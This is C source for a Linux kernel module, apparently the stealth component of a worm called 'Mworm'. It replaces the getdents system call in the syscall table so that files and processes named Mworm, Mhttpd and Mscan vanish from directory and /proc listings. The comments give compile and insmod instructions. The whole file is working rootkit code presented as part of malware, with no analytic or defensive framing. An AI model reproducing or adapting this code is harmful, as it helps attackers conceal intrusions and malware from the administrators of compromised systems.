   //3c95.c
   //hide the Mworm
   //Based on Mscan
   //Part of Mworm
   //compile: gcc -O3 -DMODULE -D__KERNEL__ -c 3c95.c
   //Usage: insmod 3c95.o
   //   rmmmod 3c95.o

   #include <linux/config.h>
   #include <linux/module.h>
   #include <linux/version.h>
   #include <linux/kernel.h>
   #include <linux/malloc.h>
   #include <linux/fs.h>
   #include <linux/dirent.h>
   #include <linux/proc_fs.h>
   #include <linux/types.h>
   #include <linux/stat.h>
   #include <linux/fcntl.h>
   #include <linux/mm.h>
   #include <linux/if.h>
   #include <sys/syscall.h>
   #include <asm/types.h>
   #include <asm/uaccess.h>
   #include <asm/unistd.h>
   #include <asm/segment.h>
   #include <linux/types.h>
   #include <linux/malloc.h>
   #include <asm/unistd.h>
   #include <asm/string.h>

   #define HIDE_PS1    "Mworm"
   #define HIDE_PS2    "Mhttpd"
   #define HIDE_FILE1  "Mscan"

   extern void* sys_call_table[];
   int (*old_getdents)(uint,struct dirent *,uint);


   int myatoi(char *str){
    int res = 0;
    int mul = 1;
    char *ptr;
    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
     if (*ptr < '0' || *ptr > '9')
      return (-1);
     res += (*ptr - '0') * mul;
     mul *= 10;
   }
    return (res);
   }

   struct task_struct *get_task_structure(pid_t n){
    struct task_struct *tsp;
    int t;
           tsp=current;
           do{
                   if(tsp->pid==n)return tsp;
                    tsp=tsp->next_task;
           }while(tsp!=current);
           return NULL;
   }

   int new_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){
    int hmr,hme,original_ret,left;
    struct dirent *d,*d2;
    struct inode *dinode;
    int ps=0,tohide;
    struct task_struct *tsp;

           if((original_ret=old_getdents(fd,dirp,count))==-1)return( -1 );
           #ifdef __LINUX_DCACHE_H
                   dinode=current->files->fd[fd]->f_dentry->d_inode;
           #else
                   dinode=current->files->fd[fd]->f_inode;
           #endif
            if (dinode->i_ino==PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev)==1)
           ps=1;


           d=(struct dirent *)kmalloc(original_ret,GFP_KERNEL);
           copy_from_user(d,dirp,original_ret);
           d2=d;
           left=original_ret;
           hme=0;
           while(left>0){
                   hmr=d2->d_reclen;
                   left-=hmr;
                   tohide=0;
                   if(ps){
                           tsp=get_task_structure(myatoi(d2->d_name));
                           if((tsp!=NULL)&&(strstr(tsp->comm,HIDE_PS1))) tohide=1;
                           if((tsp!=NULL)&&(strstr(tsp->comm,HIDE_PS2))) tohide=1;
                   }
                   if((strstr((char*)d2->d_name,HIDE_PS1))||(strstr((char*)d2->d_name,HIDE_PS1))
                       ||(strstr((char*)d2->d_name,HIDE_FILE1)) || (tohide)){
                           if(left>0)memmove(d2,(char*)d2+hmr,left);
                            else d2->d_off=1024;
                           original_ret-=hmr;
                   }
                   else d2=(struct dirent*)((char*)d2+hmr);
           }
           copy_to_user(dirp,d,original_ret);
           kfree(d);
           return original_ret;
   }

   int init_module(void){
    int t;
           old_getdents=sys_call_table[SYS_getdents];
           sys_call_table[SYS_getdents]=new_getdents;
           return 0;

   }
   void cleanup_module(void){
           sys_call_table[SYS_getdents]=old_getdents;
       return;
   }
